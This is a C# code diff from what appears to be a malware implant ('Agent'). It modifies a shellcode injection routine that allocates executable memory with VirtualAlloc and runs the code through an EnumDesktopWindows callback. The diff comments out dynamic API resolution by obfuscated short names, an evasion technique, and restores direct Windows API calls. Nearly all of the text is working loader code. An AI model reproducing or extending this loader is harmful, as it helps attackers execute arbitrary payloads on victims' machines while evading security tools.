@@ -34,14 +34,14 @@ namespace Agent
         {
             List<string> k32Funcs = new List<string>
             {
-                 "va",        // VirtualAlloc (kernel32.dll)
-                 "gcti"       // GetCurrentThreadId (kernel32.dll)
+              //    "va",        // VirtualAlloc (kernel32.dll) this might be broke as delegate
+             //    "gcti"       // GetCurrentThreadId (kernel32.dll)
             };
 
             List<string> u32Funcs = new List<string>
             {
-                 "gtd",        // GetThreadDesktop (user32.dll)
-                 "edw"      // EnumDesktopWindows (user32.dll)
+              //   "gtd",        // GetThreadDesktop (user32.dll)
+              //   "edw"      // EnumDesktopWindows (user32.dll)
             };
 
             //resolve u32 and k32 funcs
@@ -53,12 +53,10 @@ namespace Agent
             }
 
             //Injection
-
-
             //Allocate Memory for shellcode
-            //IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            object[] vaParams = new object[] { IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE };
-            IntPtr funcAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("va"), typeof(VADelegate), ref vaParams);
+            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            //object[] vaParams = new object[] { IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE };
+            //IntPtr funcAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("va"), typeof(VADelegate), ref vaParams);
 
             if (funcAddr == IntPtr.Zero)
             {
@@ -75,13 +73,14 @@ namespace Agent
             var funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(EnumDesktopWindowsProc));
 
             //Get current thread ID
-            //IntPtr hDesktop = GetThreadDesktop(GetCurrentThreadId()); 
-            object[] gctParams = Array.Empty<object>(); // No parameters for GetCurrentThreadId
-            uint threadId = Generic.InvokeFunc<uint>(Resolver.GetFunc("gcti"), typeof(GCTDelegate), ref gctParams);
+            IntPtr hDesktop = GetThreadDesktop(GetCurrentThreadId());
+            //object[] gctParams = Array.Empty<object>(); // No parameters for GetCurrentThreadId
+            //uint threadId = Generic.InvokeFunc<uint>(Resolver.GetFunc("gcti"), typeof(GCTDelegate), ref gctParams);
 
             //Get the current Desktop for the thread ID
-            object[] gtdParams = [threadId]; // GetThreadDesktop takes the thread ID
-            IntPtr hDesktop = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("gtd"), typeof(GTDDelegate), ref gtdParams);
+            //object[] gtdParams = [threadId]; // GetThreadDesktop takes the thread ID
+            //IntPtr hDesktop = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("gtd"), typeof(GTDDelegate), ref gtdParams);
+
 
             if (hDesktop == IntPtr.Zero)
             {
